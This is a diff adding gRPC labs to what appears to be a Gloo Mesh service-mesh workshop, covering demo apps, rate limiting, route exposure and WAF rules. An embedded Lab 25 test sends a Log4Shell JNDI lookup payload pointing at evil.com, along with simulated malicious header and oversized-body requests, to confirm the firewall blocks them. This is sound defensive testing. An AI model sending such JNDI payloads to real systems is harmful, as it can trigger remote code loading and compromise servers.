@@ -32,6 +32,13 @@ source ./scripts/assert.sh
 * [Lab 16 - Apply rate limiting to the Gateway](#lab-16---apply-rate-limiting-to-the-gateway-)
 * [Lab 17 - Use the Web Application Firewall filter](#lab-17---use-the-web-application-firewall-filter-)
 * [Lab 18 - Use the WAF to block based on source country](#lab-18---use-the-waf-to-block-based-on-source-country-)
+* [Lab 19 - Deploy the grpc greeter demo app](#lab-19---deploy-the-grpc-greeter-demo-app-)
+* [Lab 20 - Create the grpc-greeter workspace](#lab-20---create-the-grpc-greeter-workspace-)
+* [Lab 21 - Apply rate limiting to the gRPC calls](#lab-21---apply-rate-limiting-to-the-grpc-calls-)
+* [Lab 22 - Deploy the grpcbin demo app](#lab-22---deploy-the-grpcbin-demo-app-)
+* [Lab 23 - Create the grpcbin workspace](#lab-23---create-the-grpcbin-workspace-)
+* [Lab 24 - Expose the gRPC service](#lab-24---expose-the-grpc-service-)
+* [Lab 25 - Use the Web Application Firewall filter to block gRPC traffic](#lab-25---use-the-web-application-firewall-filter-to-block-grpc-traffic-)
 
 
 
@@ -2812,6 +2819,787 @@ And finally, revert the patches to the ingress gateway and gateway service:
 kubectl --context ${CLUSTER1} -n istio-gateways patch deployment $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') --type json --patch-file data/steps/gateway-geoblock/gateway-patch-revert.json
 kubectl --context ${CLUSTER1} -n istio-gateways patch svc $(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}') -p '{"spec":{"externalTrafficPolicy":"Cluster"}}'
 ```
+
+
+
+## Lab 19 - Deploy the grpc greeter demo app <a name="lab-19---deploy-the-grpc-greeter-demo-app-"></a>
+
+We're going to deploy the `grpc-greeter` application to demonstrate several features of Gloo Mesh.
+
+You can find more infrmation about this application [here](https://grpc.io/docs/languages/node/quickstart/).
+
+Run the following commands to deploy the grpc-greeter app on `cluster1`.
+
+```bash
+kubectl --context ${CLUSTER1} create ns grpc-greeter
+kubectl --context ${CLUSTER1} label namespace grpc-greeter istio.io/rev=1-18
+
+kubectl --context ${CLUSTER1} apply -n grpc-greeter -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: greeter-server
+spec:
+  selector:
+    matchLabels:
+      app: greeter-server
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: greeter-server
+    spec:
+      containers:
+      - name: greeter-server
+        ports:
+        - protocol: TCP
+          containerPort: 50051
+        image: ghcr.io/anvilco/load-balance-grpc-k8s:latest
+        imagePullPolicy: Always
+        command:
+          - node
+          - greeter_server
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: greeter-server
+  labels:
+    app: greeter-server
+spec:
+  selector:
+    app: greeter-server
+  ports:
+  - port: 50051
+    name: grpc
+    protocol: TCP
+    targetPort: 50051
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: greeter-client
+spec:
+  selector:
+    matchLabels:
+      app: greeter-client
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: greeter-client
+    spec:
+      containers:
+      - name: greeter-client
+        image: ghcr.io/anvilco/load-balance-grpc-k8s:latest
+        imagePullPolicy: Always
+        command:
+          - /bin/sh
+          - -c
+          - 'sleep 1800' # 30m TTL
+
+EOF
+```
+
+You can check that the app is running using
+
+```
+kubectl --context ${CLUSTER1} -n grpc-greeter get pods
+```
+
+```
+NAME                              READY   STATUS    RESTARTS   AGE
+greeter-client-5d9694c4d-gxq69    2/2     Running   0          24m
+greeter-server-6999f5d5ff-2w9tf   2/2     Running   0          24m
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
+
+describe("grpc-greeter app", () => {
+  let cluster = process.env.CLUSTER1;
+  let deployments = ["greeter-client", "greeter-server"];
+  deployments.forEach(deploy => {
+    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "grpc-greeter", k8sObj: deploy }));
+  });
+});
+EOF
+echo "executing test dist/edeka/build/templates/steps/apps/grpc-greeter/deploy-grpc-greeter/tests/check-grpc-greeter.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+
+
+## Lab 20 - Create the grpc-greeter workspace <a name="lab-20---create-the-grpc-greeter-workspace-"></a>
+
+We're going to create a workspace for the team in charge of the grpc-greeter application.
+
+The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.
+
+Let's create the `grpc-greeter` workspace which corresponds to the `grpc-greeter` namespace on `cluster1`:
+
+```bash
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: Workspace
+metadata:
+  name: grpc-greeter
+  namespace: gloo-mesh
+  labels:
+    allow_ingress: "true"
+spec:
+  workloadClusters:
+  - name: cluster1
+    namespaces:
+    - name: grpc-greeter
+EOF
+```
+
+Then, the grpc-greeter team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `grpc-greeter` workspace:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: WorkspaceSettings
+metadata:
+  name: grpc-greeter
+  namespace: grpc-greeter
+spec:
+  importFrom:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+EOF
+```
+
+
+
+## Lab 21 - Apply rate limiting to the gRPC calls <a name="lab-21---apply-rate-limiting-to-the-grpc-calls-"></a>
+
+
+In this step, we're going to apply rate limiting to only allow 50 requests per minute when sending requests to the gRPC `greeter` service.
+
+What's interesting to note is that gRPC is based on HTTP2 and rate limiting will be applied based on the number of gRPC calls inside a unique HTTP2 connection.
+
+We're applying it to east/west traffic sent to the greeter service, but we could do the same for north/south traffic.
+
+First, we need to create a `RateLimitClientConfig` object to define the descriptors:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitClientConfig
+metadata:
+  name: grpc-greeter
+  namespace: grpc-greeter
+spec:
+  raw:
+    rateLimits:
+    - actions:
+      - genericKey:
+          descriptorValue: counter
+EOF
+```
+
+Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerConfig
+metadata:
+  name: grpc-greeter
+  namespace: grpc-greeter
+spec:
+  destinationServers:
+  - ref:
+      cluster: cluster1
+      name: rate-limiter
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+  raw:
+    descriptors:
+    - key: generic_key
+      rateLimit:
+        requestsPerUnit: 50
+        unit: MINUTE
+      value: counter
+EOF
+```
+
+After that, we need to create a `RateLimitPolicy` object to define the descriptors:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitPolicy
+metadata:
+  name: grpc-greeter
+  namespace: grpc-greeter
+spec:
+  applyToDestinations:
+  - port:
+      number: 50051
+    selector:
+      labels:
+        app: greeter-server
+  config:
+    serverSettings:
+      name: rate-limit-server
+      namespace: grpc-greeter
+      cluster: cluster1
+    ratelimitClientConfig:
+      name: grpc-greeter
+      namespace: grpc-greeter
+      cluster: cluster1
+    ratelimitServerConfig:
+      name: grpc-greeter
+      namespace: grpc-greeter
+      cluster: cluster1
+EOF
+```
+
+For teams to setup rate limiting, the gateways team needs to create and `RateLimitServerSettings` object they can reference.
+
+Finally, we need to create a `RateLimitServerSettings` object to define which rate limiter to use:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerSettings
+metadata:
+  name: rate-limit-server
+  namespace: grpc-greeter
+spec:
+  destinationServer:
+    ref:
+      cluster: cluster1
+      name: rate-limiter
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+EOF
+```
+
+Modify the `greeter_client.js` file to handle errors:
+
+```bash
+kubectl --context ${CLUSTER1} -n grpc-greeter exec -t deploy/greeter-client -- sed -i 's/console.log(`#${i+1} - Greeting: ${response.message}`);/err ? console.log(`#${i+1} - Greeting: ${err}`) : console.log(`#${i+1} - Greeting: ${response.message}`);/' greeter_client.js
+```
+
+Run the following command to send 100 greetings through the same connection:
+
+```bash
+kubectl --context ${CLUSTER1} -n grpc-greeter exec -t deploy/greeter-client -- node greeter_client.js | tee out.txt
+```
+
+You should get a mix of good and bad responses:
+
+```
+...
+#93 - Greeting: Hello from greeter-server-6999f5d5ff-crxts, Anvil User!
+#96 - Greeting: Hello from greeter-server-6999f5d5ff-crxts, Anvil User!
+#100 - Greeting: Hello from greeter-server-6999f5d5ff-crxts, Anvil User!
+#89 - Greeting: Hello from greeter-server-6999f5d5ff-crxts, Anvil User!
+#2 - Greeting: Error: 14 UNAVAILABLE: 
+#3 - Greeting: Error: 14 UNAVAILABLE: 
+#14 - Greeting: Error: 14 UNAVAILABLE:
+...
+```
+
+But 50 of them should be bad ones.
+
+Let's count them!
+
+```
+grep -c "UNAVAILABLE" out.txt
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
+
+describe("gRPC rate limiting is working properly", () => {
+  const command = "kubectl -n grpc-greeter exec deploy/greeter-client --context " + process.env.CLUSTER1 + " -- node greeter_client";
+  it('Got some requests allowed', () => helpers.genericCommand({ command: command, responseContains: "Hello from greeter-server" }));
+  it('Got some requests rejected', () => helpers.genericCommand({ command: command, responseContains: "UNAVAILABLE" }));
+});
+EOF
+echo "executing test dist/edeka/build/templates/steps/apps/grpc-greeter/grpc-ratelimiting/tests/rate-limited.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+Let's delete the different objects we've created:
+
+```bash
+kubectl --context ${CLUSTER1} -n grpc-greeter delete ratelimitpolicy grpc-greeter
+kubectl --context ${CLUSTER1} -n grpc-greeter delete ratelimitclientconfig grpc-greeter
+kubectl --context ${CLUSTER1} -n grpc-greeter delete ratelimitserverconfig grpc-greeter
+kubectl --context ${CLUSTER1} -n grpc-greeter delete ratelimitserversettings rate-limit-server
+```
+
+
+
+
+
+## Lab 22 - Deploy the grpcbin demo app <a name="lab-22---deploy-the-grpcbin-demo-app-"></a>
+
+We're going to deploy the grpcbin application to demonstrate several features of Gloo Mesh.
+
+You can find more infrmation about this application [here](https://grpcb.in).
+
+
+
+Run the following commands to deploy the grpcbin app on `cluster1`.
+
+```bash
+kubectl --context ${CLUSTER1} create ns grpcbin
+kubectl --context ${CLUSTER1} label namespace grpcbin istio.io/rev=1-18
+
+kubectl --context ${CLUSTER1} apply -n grpcbin -f - <<EOF
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: grpcbin
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: grpcbin
+  labels:
+    app: grpcbin
+    service: grpcbin
+spec:
+  ports:
+  - name: grpc
+    port: 9000
+    targetPort: 9000
+  selector:
+    app: grpcbin
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: grpcbin
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: grpcbin
+      version: v1
+  template:
+    metadata:
+      labels:
+        app: grpcbin
+        version: v1
+    spec:
+      serviceAccountName: grpcbin
+      containers:
+      - image: docker.io/moul/grpcbin
+        imagePullPolicy: IfNotPresent
+        name: grpcbin
+        ports:
+        - containerPort: 9000
+
+EOF
+```
+
+You can check that the app is running using
+
+```
+kubectl --context ${CLUSTER1} -n grpcbin get pods
+```
+
+```
+NAME                           READY   STATUS    RESTARTS   AGE
+grpcbin-5d9d9217b5-qrdgd       2/2     Running   0          11s
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
+
+describe("grpcbin app", () => {
+  let cluster = process.env.CLUSTER1;
+  let deployments = ["grpcbin"];
+  deployments.forEach(deploy => {
+    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "grpcbin", k8sObj: deploy }));
+  });
+});
+EOF
+echo "executing test dist/edeka/build/templates/steps/apps/grpcbin/deploy-grpcbin/tests/check-grpcbin.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+
+
+## Lab 23 - Create the grpcbin workspace <a name="lab-23---create-the-grpcbin-workspace-"></a>
+
+We're going to create a workspace for the team in charge of the grpcbin application.
+
+The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.
+
+Let's create the `grpcbin` workspace which corresponds to the `grpcbin` namespace on `cluster1`:
+
+```bash
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: Workspace
+metadata:
+  name: grpcbin
+  namespace: gloo-mesh
+  labels:
+    allow_ingress: "true"
+spec:
+  workloadClusters:
+  - name: cluster1
+    namespaces:
+    - name: grpcbin
+EOF
+```
+
+Then, the grpcbin team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `grpcbin` workspace:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: WorkspaceSettings
+metadata:
+  name: grpcbin
+  namespace: grpcbin
+spec:
+  importFrom:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+  exportTo:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+      labels:
+        app: httpbin
+    - kind: ALL
+      labels:
+        expose: "true"
+EOF
+```
+
+The grpcbin team has decided to export the following to the `gateway` workspace (using a reference):
+- the `grpcbin` Kubernetes service
+- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`
+
+
+
+
+## Lab 24 - Expose the gRPC service <a name="lab-24---expose-the-grpc-service-"></a>
+
+In this step, we're going to expose the gRPC service through a Gateway using Gloo Mesh.
+
+You can create a `RouteTable` to expose the `grpcbin` service through the gateway:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: grpcbin
+  namespace: grpcbin
+  labels:
+    expose: "true"
+spec:
+  http:
+    - name: grpcbin
+      matchers:
+      - uri:
+          prefix: /grpcbin
+      forwardTo:
+        destinations:
+        - ref:
+            name: grpcbin
+            namespace: grpcbin
+          port:
+            number: 9000
+EOF
+```
+
+Let's try to access the gRPC service.
+
+```bash
+wget https://github.com/fullstorydev/grpcurl/releases/download/v1.8.7/grpcurl_1.8.7_linux_x86_64.tar.gz
+tar -xf grpcurl*
+wget -qN https://raw.githubusercontent.com/moul/pb/bca18df4138cc423a9f8513f9c7d5f71f1ea4b35/grpcbin/grpcbin.proto
+./grpcurl -insecure -proto ./grpcbin.proto ${ENDPOINT_HTTPS_GW_CLUSTER1} list grpcbin.GRPCBin
+./grpcurl -insecure -proto ./grpcbin.proto -d '{"f_string":"hello"}' ${ENDPOINT_HTTPS_GW_CLUSTER1} grpcbin.GRPCBin/DummyUnary
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+var chai = require('chai');
+var expect = chai.expect;
+chai.use(chaiExec);
+
+afterEach(function (done) {
+  if (this.currentTest.currentRetry() > 0) {
+    process.stdout.write(".");
+    setTimeout(done, 1000);
+  } else {
+    done();
+  }
+});
+
+describe("gRPC", function() {
+  it('gRPC call returning the expected output', function () {
+    expect(process.env.ENDPOINT_HTTPS_GW_CLUSTER1).to.not.be.empty
+    let command = `grpcurl -insecure -proto ./grpcbin.proto -d '{"f_string":"hello"}' ${process.env.ENDPOINT_HTTPS_GW_CLUSTER1} grpcbin.GRPCBin/DummyUnary`
+    let cli = chaiExec(command);
+    expect(cli).to.exit.with.code(0);
+    expect(cli).output.to.contain('hello');
+  })
+});
+EOF
+echo "executing test dist/edeka/build/templates/steps/apps/grpcbin/grpc-expose/tests/grpcbin.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+
+
+
+## Lab 25 - Use the Web Application Firewall filter to block gRPC traffic <a name="lab-25---use-the-web-application-firewall-filter-to-block-grpc-traffic-"></a>
+
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections, including gRPC as well. 
+
+Here's an example of how using Gloo Mesh we'd easily mitigate malicious gRPC requests.
+
+Create the WAF policy:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: grpc-header-waf
+  namespace: grpcbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        waf: "true"
+  config:
+    auditLogging:
+      action: ALWAYS
+      location: DYNAMIC_METADATA
+    customInterventionMessage: Evil header detected!
+    customRuleSets:
+    - ruleStr: |2
+        SecRuleEngine On
+        SecRule REQUEST_HEADERS:Key "evil" "deny,status:403,id:1,phase:1,msg:'key header blocked'"
+    disableCoreRuleSet: true
+    priority: 0
+
+EOF
+```
+
+In this example, we're going to update the main `RouteTable` to enforce this policy for all the applications exposed through the gateway (in any workspace).
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: main
+  namespace: istio-gateways
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: root
+      labels:
+        waf: "true"
+      matchers:
+      - uri:
+          prefix: /
+      delegate:
+        routeTables:
+          - labels:
+              expose: "true"
+        sortMethod: ROUTE_SPECIFICITY
+EOF
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("WAF is working properly", function() {
+  it('The request has been blocked', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
+});
+
+EOF
+echo "executing test dist/edeka/build/templates/steps/apps/grpcbin/gateway-grpc-waf/tests/waf.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
+
+Run the following command to simulate an attack:
+
+```bash
+./grpcurl -H "Key: evil" -insecure -proto ./grpcbin.proto -d '{"f_string":"hello"}' ${ENDPOINT_HTTPS_GW_CLUSTER1} grpcbin.GRPCBin/DummyUnary
+```
+
+The request should be rejected:
+
+```,nocopy
+ERROR:
+  Code: PermissionDenied
+  Message: Evil header detected!
+```
+
+Now, let's catch malicious gRPC requests by limiting the size of the request body!
+
+First, let's expose the size of the body of a request as a header!
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: networking.istio.io/v1alpha3
+kind: EnvoyFilter
+metadata:
+  name: request-size
+  namespace: istio-gateways
+spec:
+  workloadSelector:
+    labels:
+      app: istio-ingressgateway
+      istio: ingressgateway
+      revision: 1-18
+  configPatches:
+  - applyTo: HTTP_FILTER
+    match:
+      context: GATEWAY
+      listener:
+        filterChain:
+          filter:
+            name: "envoy.filters.network.http_connection_manager"
+    patch:
+      operation: INSERT_BEFORE
+      value:
+        name: envoy.lua
+        typed_config:
+          "@type": type.googleapis.com/envoy.extensions.filters.http.lua.v3.Lua
+          inlineCode: |
+            function envoy_on_request(request_handle)
+              local body_size = request_handle:body():length()
+              request_handle:headers():add("request-body-size", body_size)
+            end
+
+EOF
+```
+
+Then, apply the following `WAFPolicy`, that will deny requests with a body size larger than 18.000 bytes!
+
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: grpc-header-waf
+  namespace: grpcbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        waf: "true"
+  config:
+    auditLogging:
+      action: ALWAYS
+      location: DYNAMIC_METADATA
+    customInterventionMessage: Request body too large!
+    customRuleSets:
+    - ruleStr: |
+        SecRuleEngine On
+        SecRule REQUEST_HEADERS:request-body-size "@gt 18000" "id:100001,phase:2,deny,status:403,msg:'Request body too large'"
+        SecResponseBodyLimit 5
+    disableCoreRuleSet: true
+    priority: 0
+
+EOF
+```
+
+Now, we will send the malicious request:
+
+```
+./grpcurl -insecure -proto ./grpcbin.proto -d "{\"f_string\":\"$(printf 'a%.0s' {1..20000})\"}" ${ENDPOINT_HTTPS_GW_CLUSTER1} grpcbin.GRPCBin/DummyUnary
+
+```
+
+You should get this message:
+
+```,nocopy
+ERROR:
+  Code: PermissionDenied
+  Message: Request body too large!
+```
+
+Let's apply the original `RouteTable` yaml:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: main
+  namespace: istio-gateways
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: root
+      matchers:
+      - uri:
+          prefix: /
+      delegate:
+        routeTables:
+          - labels:
+              expose: "true"
+        sortMethod: ROUTE_SPECIFICITY
+EOF
+```
+
+And also delete the WAF policy we've created:
+
+```bash
+kubectl --context ${CLUSTER1} -n grpcbin delete wafpolicies.security.policy.gloo.solo.io grpc-header-waf
+kubectl --context ${CLUSTER1} -n istio-gateways delete envoyfilters.networking.istio.io request-size
+```
+
+
 
 
 
